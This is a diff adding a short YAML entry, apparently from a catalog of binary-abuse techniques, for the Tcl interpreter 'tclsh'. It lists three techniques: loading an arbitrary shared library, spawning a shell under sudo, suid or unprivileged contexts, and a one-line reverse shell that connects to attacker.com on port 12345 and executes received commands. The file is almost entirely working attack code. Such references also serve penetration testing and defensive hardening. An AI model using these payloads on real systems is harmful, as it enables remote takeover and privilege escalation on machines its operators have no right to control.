@@ -1,0 +1,29 @@
+---
+functions:
+  library-load:
+  - code: |-
+      tclsh
+      load /path/to/lib.so x
+    contexts:
+      capabilities:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      tclsh
+      set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener: tcp-server
+    tty: false
+  shell:
+  - code: |-
+      tclsh
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+...
